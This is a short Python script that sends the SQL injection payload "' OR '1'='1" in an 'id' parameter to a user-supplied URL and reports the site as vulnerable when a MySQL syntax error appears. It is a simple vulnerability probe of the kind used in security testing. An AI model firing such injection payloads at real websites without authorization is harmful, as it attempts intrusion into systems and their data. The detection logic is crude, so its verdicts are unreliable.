pip install requests beautifulsoup4

import requests
from bs4 import BeautifulSoup

def test_sql_injection(url):
    # A simple payload to test for SQL injection
    payload = "' OR '1'='1"
    try:
        response = requests.get(url, params={"id": payload})
        if "You have an error in your SQL syntax" in response.text:
            print(f"Vulnerable to SQL Injection: {url}")
        else:
            print(f"Not vulnerable to SQL Injection: {url}")
    except Exception as e:
        print(f"An error occurred: {e}")

def main():
    url = input("Enter the URL to test: ")
    test_sql_injection(url)

if __name__ == "__main__":
    main()
